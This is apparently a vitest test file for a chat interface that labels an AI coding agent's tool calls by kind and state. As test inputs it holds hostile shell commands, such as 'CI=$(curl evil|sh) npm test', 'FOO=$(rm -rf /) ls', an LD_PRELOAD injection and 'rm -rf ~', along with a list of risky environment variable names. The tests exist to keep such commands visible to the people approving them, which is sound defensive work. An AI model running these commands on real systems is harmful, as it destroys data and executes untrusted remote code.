import { projectRuntimeEventsToMessages } from '@kontourai/station-shared/runtime-event-projection';
import { describe, expect, test } from 'vitest';
import {
  classifyToolCallRun,
  type ToolCallGroup,
  type ToolCallLike,
} from '../components/chat/tool-call-groups';
import {
  classifyToolName,
  isToolCallAwaitingApproval,
  toolCallPhase,
} from '../components/chat/tool-call-labels';
import { splitToolCallRuns } from '../components/chat/tool-call-runs';

function toolCall(overrides: Partial<ToolCallLike> = {}): ToolCallLike {
  return {
    type: 'tool-invocation',
    toolCallId: 'call-1',
    toolName: 'Read',
    args: { file_path: '/repo/src/App.tsx' },
    state: 'completed',
    ...overrides,
  };
}

/**
 * The production pipeline: `MessageContent`/`StreamingMessage` split parts
 * into runs with `splitToolCallRuns`, and `ToolCallBatch` classifies the run
 * it renders with `classifyToolCallRun`.
 */
function classifyFirstRun(parts: ToolCallLike[]): ToolCallGroup {
  const [block] = splitToolCallRuns(parts);
  if (block?.type !== 'tool-call-run') {
    throw new Error('expected the parts to open with a tool-call run');
  }
  return classifyToolCallRun(block);
}

describe('isToolCallAwaitingApproval', () => {
  test('matches the producer shape from request.opened', () => {
    expect(
      isToolCallAwaitingApproval({
        needsApproval: true,
        state: 'awaiting-approval',
      }),
    ).toBe(true);
  });

  test('refuses a call that already has a result, failed, cancelled, or went unresolved', () => {
    expect(
      isToolCallAwaitingApproval({
        needsApproval: true,
        state: 'awaiting-approval',
        result: 'ok',
      }),
    ).toBe(false);
    expect(
      isToolCallAwaitingApproval({
        needsApproval: true,
        state: 'error',
      }),
    ).toBe(false);
    expect(
      isToolCallAwaitingApproval({
        needsApproval: true,
        state: 'unresolved',
      }),
    ).toBe(false);
    expect(
      isToolCallAwaitingApproval({
        needsApproval: true,
        cancelled: true,
      }),
    ).toBe(false);
  });
});

describe('classifyToolName', () => {
  test('classifies known Claude Code tool names', () => {
    expect(classifyToolName('Read')).toBe('read');
    expect(classifyToolName('Write')).toBe('write');
    expect(classifyToolName('Edit')).toBe('write');
    expect(classifyToolName('Bash')).toBe('exec');
    expect(classifyToolName('Grep')).toBe('search');
    expect(classifyToolName('Glob')).toBe('search');
  });

  test('classifies Codex-style tool names', () => {
    expect(classifyToolName('shell_exec')).toBe('exec');
    expect(classifyToolName('apply_patch')).toBe('write');
  });

  test('classifies on the tool half of a server/tool MCP name', () => {
    expect(classifyToolName('jira/create_issue')).toBe('other');
    expect(classifyToolName('fs/read_file')).toBe('read');
  });

  test('falls back to other for unrecognized and empty names', () => {
    expect(classifyToolName('create_issue')).toBe('other');
    expect(classifyToolName(undefined)).toBe('other');
    expect(classifyToolName('')).toBe('other');
    expect(classifyToolName('   ')).toBe('other');
  });
});

describe('classifyToolCallRun', () => {
  test('mixed kinds summarize as "Read 2 files, ran 2 commands"', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Read',
        args: { file_path: 'b.ts' },
      }),
      toolCall({
        toolCallId: 'c',
        toolName: 'Bash',
        args: { command: 'npm test' },
      }),
      toolCall({
        toolCallId: 'd',
        toolName: 'Bash',
        args: { command: 'npm build' },
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Read 2 files, ran 2 commands');
    expect(group.aggregateSummary).toBe(group.summary);
  });

  test('single-kind batch summarizes as "Ran 3 commands"', () => {
    const parts = [
      toolCall({ toolCallId: 'a', toolName: 'Bash', args: { command: 'a' } }),
      toolCall({ toolCallId: 'b', toolName: 'Bash', args: { command: 'b' } }),
      toolCall({
        toolCallId: 'c',
        toolName: 'shell_exec',
        args: { command: 'c' },
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Ran 3 commands');
  });

  test('singular vs plural nouns within one summary', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
      }),
      toolCall({ toolCallId: 'b', toolName: 'Bash', args: { command: 'a' } }),
      toolCall({ toolCallId: 'c', toolName: 'Bash', args: { command: 'b' } }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Read 1 file, ran 2 commands');
  });

  test('searches read as searches in every tense, never "searched 2 searches"', () => {
    const grep = (id: string, state = 'completed') =>
      toolCall({
        toolCallId: id,
        toolName: 'Grep',
        args: { pattern: 'x' },
        state,
      });
    expect(classifyFirstRun([grep('a'), grep('b')]).summary).toBe(
      'Ran 2 searches',
    );
    expect(
      classifyFirstRun([toolCall({ toolCallId: 'r' }), grep('s')]).summary,
    ).toBe('Read 1 file, ran 1 search');
    expect(
      classifyFirstRun([grep('a', 'running'), grep('b', 'running')])
        .aggregateSummary,
    ).toBe('Running 2 searches…');
  });

  test('a command known only by its title still gives way to the command after its env assignments', () => {
    const group = classifyFirstRun([
      toolCall({
        toolCallId: 'a',
        toolName:
          'STATION_DOCS_FRESHNESS=scoped STATION_DOCS_MODE=full npm run docs:check',
        toolKind: 'execute',
        args: undefined,
      }),
    ]);
    expect(group.summary).toBe('Ran npm run docs:check');
  });

  test('a call started with no outcome yet never makes the batch read as done', () => {
    // The projection's shape for the open turn's running call.
    const group = classifyFirstRun([
      toolCall({ toolCallId: 'a', toolName: 'Bash', args: { command: 'a' } }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'b' },
        state: 'call',
      }),
    ]);
    expect(group.summary).toBe('2 commands');
  });

  test('a plain failure keeps the past tense; its badge discloses it', () => {
    const group = classifyFirstRun([
      toolCall({ toolCallId: 'a', toolName: 'Bash', args: { command: 'a' } }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'b' },
        state: 'error',
        error: 'exit 1',
      }),
    ]);
    expect(group.summary).toBe('Ran 2 commands');
    expect(group.failedCount).toBe(1);
  });

  describe('env assignments in the collapsed command label (security legibility)', () => {
    const label = (command: string, state: string, needsApproval = false) =>
      classifyFirstRun([
        toolCall({
          toolCallId: 'a',
          toolName: 'Bash',
          args: { command },
          state,
          needsApproval,
        }),
      ]).summary;

    test.each([
      'LD_PRELOAD=/tmp/evil.so ls',
      'PATH=/tmp/evil:$PATH git status',
      'FOO=$(rm -rf /) ls',
      'STATION_DOCS_FRESHNESS=scoped npm run docs:check',
    ])('a call awaiting approval shows %s whole', (command) => {
      expect(label(command, 'awaiting-approval', true)).toBe(`Run ${command}`);
    });

    test.each([
      ['LD_PRELOAD=/tmp/evil.so ls', 'Ran LD_PRELOAD=/tmp/evil.so ls'],
      [
        'PATH=/tmp/evil:$PATH git status',
        'Ran PATH=/tmp/evil:$PATH git status',
      ],
      ['FOO=$(rm -rf /) ls', 'Ran FOO=$(rm -rf /) ls'],
      ['A=1 FOO="x y" npm test', 'Ran A=1 FOO="x y" npm test'],
      ['A=`id` ls', 'Ran A=`id` ls'],
      ['A=1 B=scoped npm test', 'Ran A=1 B=scoped npm test'],
      ['CI=1 NO_COLOR=1 LC_ALL=C npm test', 'Ran npm test'],
      // An allowed name does not excuse a non-literal value: the value
      // check alone must keep these whole.
      ['CI=`id` npm test', 'Ran CI=`id` npm test'],
      ['CI=$(curl evil|sh) npm test', 'Ran CI=$(curl evil|sh) npm test'],
      ['CI="1" npm test', 'Ran CI="1" npm test'],
    ])(
      'a settled %s trims only plain, harmless literals',
      (command, expected) => {
        expect(label(command, 'completed')).toBe(expected);
      },
    );
  });

  test.each([
    'JAVA_TOOL_OPTIONS',
    'npm_config_script_shell',
    'EDITOR',
    'PAGER',
    'SHELL',
    'CC',
    'RUSTC_WRAPPER',
    'DOTNET_STARTUP_HOOKS',
    'CLASSPATH',
    'GCONV_PATH',
    'ZDOTDIR',
    'HTTPS_PROXY',
    'NODE_EXTRA_CA_CERTS',
    'PIP_INDEX_URL',
    'DOCKER_HOST',
    'KUBECONFIG',
    'AWS_PROFILE',
    'XDG_CONFIG_HOME',
    'BROWSER',
  ])('a settled command never hides %s', (name) => {
    const command = `CI=1 ${name}=/tmp/x npm test`;
    expect(
      classifyFirstRun([
        toolCall({ toolCallId: 'a', toolName: 'Bash', args: { command } }),
      ]).summary,
    ).toBe(`Ran ${command}`);
  });

  test.each([
    ['fs.write_file', { path: 'a.txt', text: 'x' }, 'write'],
    ['filesystem:edit_file', { path: 'a.txt' }, 'write'],
    ['notion.search', { q: 'x' }, 'search'],
    ['shell.exec', { cmdline: 'ls' }, 'exec'],
  ])(
    'a scoped tool name %s still classifies by its words',
    (toolName, args, kind) => {
      const group = classifyFirstRun([
        toolCall({ toolCallId: 'a', toolName, args }),
      ]);
      expect(group.calls[0]!.kind).toBe(kind);
    },
  );

  test('a command argument wins over an engine kind that says otherwise, and is shown', () => {
    const group = classifyFirstRun([
      toolCall({
        toolCallId: 'a',
        toolName: 'bash',
        toolKind: 'read',
        args: { command: 'rm -rf ~' },
      }),
    ]);
    expect(group.calls[0]!.kind).toBe('exec');
    expect(group.summary).toBe('Ran rm -rf ~');
  });

  test('a pending batch of searches reads as an inventory of searches', () => {
    const grep = (id: string, extra: Partial<ToolCallLike> = {}) =>
      toolCall({
        toolCallId: id,
        toolName: 'Grep',
        args: { pattern: 'x' },
        ...extra,
      });
    expect(
      classifyFirstRun([
        grep('a'),
        grep('b', { needsApproval: true, state: 'awaiting-approval' }),
      ]).summary,
    ).toBe('2 searches');
    expect(
      classifyFirstRun([
        grep('a'),
        toolCall({ toolCallId: 'r', state: 'cancelled', cancelled: true }),
      ]).summary,
    ).toBe('1 file read, 1 search');
  });

  test('a finished batch with a cancelled call is an inventory, not an instruction', () => {
    const group = classifyFirstRun([
      toolCall({ toolCallId: 'a', toolName: 'Bash', args: { command: 'a' } }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'b' },
        state: 'cancelled',
        cancelled: true,
      }),
    ]);
    expect(group.summary).toBe('2 commands');
    expect(group.cancelledCount).toBe(1);
  });

  test('an ACP call is classified by the kind its engine reported, not by the words in its title', () => {
    const command = 'cd /tmp && gh api x | base64 -d > gsd.mjs && cat gsd.mjs';
    const group = classifyFirstRun([
      toolCall({
        toolCallId: 'a',
        toolName: command,
        toolKind: 'execute',
        args: { command, description: 'Fetch' },
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'git status --short; echo; grep -n x y',
        toolKind: 'execute',
        args: {},
      }),
    ]);
    expect(group.calls.map((call) => call.kind)).toEqual(['exec', 'exec']);
    expect(group.summary).toBe('Ran 2 commands');
    expect(group.calls[1]!.label).toBe(
      'Ran git status --short; echo; grep -n x y',
    );
  });

  test('a single call still groups sanely, labeled by its own target', () => {
    const parts = [
      toolCall({
        toolCallId: 'solo',
        toolName: 'Read',
        args: { file_path: 'src/ApprovalModeChip.tsx' },
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.calls).toHaveLength(1);
    expect(group.summary).toBe('Read ApprovalModeChip.tsx');
    expect(group.inProgress).toBe(false);
  });

  test('a live multi-call run headlines the latest running call, not the inventory phrase', () => {
    const parts = [
      toolCall({ toolCallId: 'a', toolName: 'Read', state: 'completed' }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'running',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.inProgress).toBe(true);
    // Collapsed line updates to the current tool.
    expect(group.summary).toBe('Running npm test…');
    // Sheet title still names the whole run.
    expect(group.aggregateSummary).toBe('Reading 1 file, running 1 command…');
  });

  test('a later running call replaces the headline', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'running',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'running',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Running npm test…');
  });

  test('a failed sibling does not stop a running call from headlining', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'error',
        error: 'missing',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'running',
        progressMessage: 'compiling',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Running npm test…');
    expect(group.progressMessage).toBe('compiling');
    expect(group.failedCount).toBe(1);
  });

  test('a batch with a call waiting on approval uses the pending verb, not past tense', () => {
    // Producer shape: `runtime-event-projection.ts` stamps both
    // `needsApproval` and `state: 'awaiting-approval'` on request.opened.
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'result',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Write',
        args: { path: 'secrets.env' },
        needsApproval: true,
        state: 'awaiting-approval',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.awaitingApprovalCount).toBe(1);
    expect(group.summary).toBe('1 file read, 1 file edit');
    expect(group.aggregateSummary).toBe(group.summary);
    expect(group.summary).not.toMatch(/edited/i);
    expect(group.calls.map((call) => call.awaitingApproval)).toEqual([
      false,
      true,
    ]);
  });

  test('a running sibling does not headline a batch that also awaits approval', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'running',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Write',
        args: { path: 'secrets.env' },
        needsApproval: true,
        state: 'awaiting-approval',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.inProgress).toBe(true);
    expect(group.summary).toBe('1 file read, 1 file edit');
    expect(group.summary).not.toContain('…');
  });

  test('a known failure does not strip past tense from successful siblings', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'completed',
        result: 'ok',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'npm run lint' },
        state: 'error',
        error: 'exit 1',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Ran 2 commands');
    expect(group.failedCount).toBe(1);
  });

  test('a user-denied write in a batch never claims the edit landed', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'result',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Write',
        args: { path: 'secrets.env' },
        needsApproval: false,
        state: 'awaiting-approval',
        approvalStatus: 'user-denied',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(toolCallPhase(parts[1])).toBe('unresolved');
    expect(group.summary).toBe('1 file read, 1 file edit');
    expect(group.summary).not.toMatch(/edited/i);
  });

  test('a cancelled write in a batch never claims the edit landed', () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'result',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Write',
        args: { path: 'secrets.env' },
        state: 'cancelled',
        cancelled: true,
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('1 file read, 1 file edit');
    expect(group.summary).not.toMatch(/edited/i);
  });

  test("the latest running call's progress message rides on the group", () => {
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Read',
        args: { file_path: 'a.ts' },
        state: 'completed',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'running',
        progressMessage: 'still going',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.progressMessage).toBe('still going');
    expect(group.summary).toBe('Running npm test…');
  });

  test('a solo in-progress call gets a progressive label and trailing ellipsis', () => {
    const parts = [
      toolCall({
        toolCallId: 'solo',
        toolName: 'Bash',
        args: { command: 'npm run build' },
        state: 'running',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Running npm run build…');
  });

  // station#1558 (fix round, M6): the collapsed header is what a reader sees
  // first, and it used to say "Ran npm test" for a call whose session ended
  // before it reported — contradicting the row it expands into, which
  // `ToolCallDisplay` already refuses to put in the past tense.
  test('a solo unresolved call keeps the bare verb, not the past tense', () => {
    const parts = [
      toolCall({
        toolCallId: 'solo',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'unresolved',
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Run npm test');
    // Not running either: no ellipsis, no failure claim.
    expect(group.inProgress).toBe(false);
    expect(group.failedCount).toBe(0);
  });

  // station#1569 (item 3): the same defect one level up. The BATCH header
  // derived its verb from `inProgress` alone, so a run containing an
  // unresolved call still read "Ran 2 commands" — past tense for work that
  // may never have happened, contradicting the very rows it expands into.
  describe('a batch containing an unresolved call (station#1569 item 3)', () => {
    const unresolvedBatch = (extra: Partial<ToolCallLike> = {}) => [
      toolCall({
        toolCallId: 'a',
        toolName: 'Bash',
        args: { command: 'npm test' },
        state: 'completed',
      }),
      toolCall({
        toolCallId: 'b',
        toolName: 'Bash',
        args: { command: 'npm run build' },
        state: 'unresolved',
        ...extra,
      }),
    ];

    test('takes the bare verb, never the past tense', () => {
      const group = classifyFirstRun(unresolvedBatch());
      expect(group.summary).toBe('2 commands');
      expect(group.unresolvedCount).toBe(1);
      // Not a failure claim either: nothing observed the tool fail.
      expect(group.failedCount).toBe(0);
    });

    test('counts every unresolved call in the run', () => {
      const group = classifyFirstRun([
        toolCall({ toolCallId: 'a', toolName: 'Bash', state: 'unresolved' }),
        toolCall({ toolCallId: 'b', toolName: 'Read', state: 'unresolved' }),
        toolCall({ toolCallId: 'c', toolName: 'Read', state: 'completed' }),
      ]);
      expect(group.unresolvedCount).toBe(2);
      expect(group.calls.map((call) => call.unresolved)).toEqual([
        true,
        true,
        false,
      ]);
    });

    test('does not claim flight either when a sibling call is still running', () => {
      const group = classifyFirstRun([
        toolCall({ toolCallId: 'a', toolName: 'Bash', state: 'running' }),
        toolCall({ toolCallId: 'b', toolName: 'Bash', state: 'unresolved' }),
      ]);
      // "Running 2 commands…" would be as false for the unresolved call as
      // "Ran" was; the bare verb is the only form true of both, and the
      // ellipsis (which means "still going") is dropped with it.
      expect(group.summary).toBe('2 commands');
      expect(group.inProgress).toBe(true);
      expect(group.unresolvedCount).toBe(1);
    });

    test('leaves an ordinary finished batch in the past tense', () => {
      // The discriminating control: the bare verb is conditional on an
      // unresolved call being present, not the new default.
      const group = classifyFirstRun([
        toolCall({ toolCallId: 'a', toolName: 'Bash', state: 'completed' }),
        toolCall({ toolCallId: 'b', toolName: 'Bash', state: 'completed' }),
      ]);
      expect(group.summary).toBe('Ran 2 commands');
      expect(group.unresolvedCount).toBe(0);
    });

    /**
     * station#1569 (H1): the composition the reviewer caught. The header
     * counts what the FOLD produced, so a fold that left the stale
     * `unresolved` row standing beside the real result made this read
     * "Run 2 commands · 1 with no result" for one call that succeeded.
     * Driven through the real projection rather than a hand-written part —
     * a literal `state: 'completed'` would only assert the classifier's own
     * `===`, and could not have caught this.
     */
    test('does not count a row the real result superseded', () => {
      const base = {
        provider: 'claude',
        threadId: 't1',
        createdAt: '2026-09-05T00:00:00.000Z',
      };
      const messages = projectRuntimeEventsToMessages([
        { ...base, eventId: 'e1', method: 'turn.started', turnId: 'turn-a' },
        {
          ...base,
          eventId: 'e2',
          method: 'tool.started',
          turnId: 'turn-a',
          itemId: 'i1',
          toolCallId: 'call-1',
          toolName: 'Bash',
          arguments: { command: 'npm test' },
        },
        {
          ...base,
          eventId: 'e3',
          method: 'tool.completed',
          turnId: 'turn-a',
          itemId: 'i1',
          toolCallId: 'call-1',
          toolName: 'Bash',
          status: 'unresolved',
          output:
            'No result was reported before the session ended; whether the tool ran is unknown.',
        },
        {
          ...base,
          eventId: 'e4',
          method: 'tool.completed',
          turnId: 'turn-a',
          itemId: 'i1',
          toolCallId: 'call-1',
          toolName: 'Bash',
          status: 'success',
          output: 'real output',
        },
        {
          ...base,
          eventId: 'e5',
          method: 'turn.completed',
          turnId: 'turn-a',
          finishReason: 'stop',
        },
      ] as never);

      const assistant = messages.find(
        (message) => message.role === 'assistant',
      )!;
      const group = classifyFirstRun(
        assistant.parts as unknown as ToolCallLike[],
      );
      expect(group.unresolvedCount).toBe(0);
      expect(group.summary).toBe('Ran npm test');
    });

    test('a mixed-kind batch takes the bare verb in every segment', () => {
      const group = classifyFirstRun([
        toolCall({
          toolCallId: 'a',
          toolName: 'Read',
          args: { file_path: '/repo/a.ts' },
          state: 'completed',
        }),
        toolCall({
          toolCallId: 'b',
          toolName: 'Read',
          args: { file_path: '/repo/b.ts' },
          state: 'completed',
        }),
        toolCall({
          toolCallId: 'c',
          toolName: 'Bash',
          args: { command: 'npm test' },
          state: 'unresolved',
        }),
      ]);
      expect(group.summary).toBe('2 file reads, 1 command');
    });
  });

  test('extracts a truncated command label for exec calls', () => {
    const longCommand = 'a'.repeat(120);
    const parts = [
      toolCall({
        toolCallId: 'a',
        toolName: 'Bash',
        args: { command: longCommand },
      }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary.startsWith('Ran ')).toBe(true);
    expect(group.summary.length).toBeLessThan(longCommand.length);
    expect(group.summary.endsWith('…')).toBe(true);
  });

  test('falls back to the formatted tool name when no target is extractable', () => {
    const parts = [
      toolCall({ toolCallId: 'a', toolName: 'search_files', args: undefined }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.summary).toBe('Searched search files');
  });

  test('group key is stable and derived from the first call id', () => {
    const parts = [
      toolCall({ toolCallId: 'first-id' }),
      toolCall({ toolCallId: 'second-id' }),
    ];
    const group = classifyFirstRun(parts);
    expect(group.key).toBe('tool-call-run:first-id');
  });
});

/**
 * #3364: a destructive or unknown tool must never be labelled a read. These
 * go through the production pipeline (`splitToolCallRuns` →
 * `classifyToolCallRun`), so they reach the row label the transcript shows.
 */
describe('mutating and unknown tools are labelled by what they do (#3364)', () => {
  const settled = (toolName: string, args: unknown) =>
    classifyFirstRun([toolCall({ toolCallId: 'a', toolName, args })]);

  test.each([
    'delete_file',
    'remove_file',
    'rm',
    'unlink',
    'rmdir',
    'fs/delete',
    'trashItem',
  ])('%s with a path is a delete: "Deleted secret.txt"', (toolName) => {
    const group = settled(toolName, { path: '/repo/secret.txt' });
    expect(group.calls[0]!.kind).toBe('delete');
    expect(group.summary).toBe('Deleted secret.txt');
  });

  test('a delete in flight and one awaiting approval take their own tenses', () => {
    const running = classifyFirstRun([
      toolCall({
        toolCallId: 'a',
        toolName: 'delete_file',
        args: { path: 'secret.txt' },
        state: 'running',
      }),
    ]);
    expect(running.calls[0]!.label).toBe('Deleting secret.txt');
    const proposed = classifyFirstRun([
      toolCall({
        toolCallId: 'a',
        toolName: 'delete_file',
        args: { path: 'secret.txt' },
        state: 'call',
        needsApproval: true,
      }),
    ]);
    expect(proposed.calls[0]!.label).toBe('Delete secret.txt');
  });

  test("an engine's own delete kind is a delete", () => {
    const group = classifyFirstRun([
      toolCall({
        toolCallId: 'a',
        toolName: 'Remove the old build output',
        toolKind: 'delete',
        args: { path: '/repo/dist' },
      }),
    ]);
    expect(group.calls[0]!.kind).toBe('delete');
    expect(group.summary).toBe('Deleted dist');
  });

  test('a batch of deletes counts them as deletions, not edits', () => {
    const group = classifyFirstRun([
      toolCall({ toolCallId: 'a', toolName: 'rm', args: { path: 'a.txt' } }),
      toolCall({ toolCallId: 'b', toolName: 'rm', args: { path: 'b.txt' } }),
    ]);
    expect(group.aggregateSummary).toBe('Deleted 2 files');
  });

  test.each(['move_file', 'rename_file', 'mv', 'copy_file', 'mkdir'])(
    '%s with a path is a write, not a read',
    (toolName) => {
      const group = settled(toolName, { path: '/repo/notes.md' });
      expect(group.calls[0]!.kind).toBe('write');
      expect(group.summary).toBe('Edited notes.md');
    },
  );

  test.each(['list_files', 'ls'])('%s with a path is a read', (toolName) => {
    const group = settled(toolName, { path: '/repo/src' });
    expect(group.calls[0]!.kind).toBe('read');
    expect(group.summary).toBe('Read src');
  });

  test.each([
    ['frobnicate', 'Used frobnicate on secret.txt'],
    ['archive_item', 'Used archive item on secret.txt'],
    ['sync-file', 'Used sync-file on secret.txt'],
  ])(
    'an unknown tool %s with only a path names the tool and its target, never a read',
    (toolName, label) => {
      for (const key of ['path', 'file_path', 'filePath', 'filepath']) {
        const group = settled(toolName, { [key]: '/repo/secret.txt' });
        expect(group.calls[0]!.kind).toBe('other');
        expect(group.summary).toBe(label);
        expect(group.summary).not.toMatch(/^Read/);
      }
    },
  );

  test('names are split into words, never substring-matched', () => {
    // `readme` is not `read`; `remove` wins over it and is not `move`.
    expect(classifyToolName('readme_remove')).toBe('delete');
    expect(classifyToolName('readmeRemove')).toBe('delete');
    expect(classifyToolName('remover_status')).toBe('other');
    expect(classifyToolName('unread_count')).toBe('other');
    expect(classifyToolName('format_disk')).toBe('other');
    expect(settled('readme_sync', { path: 'README.md' }).summary).toBe(
      'Used readme sync on README.md',
    );
  });

  test('a delete or write word outranks a read word in the same name', () => {
    expect(classifyToolName('read_and_delete')).toBe('delete');
    expect(classifyToolName('view_edit')).toBe('write');
  });
});
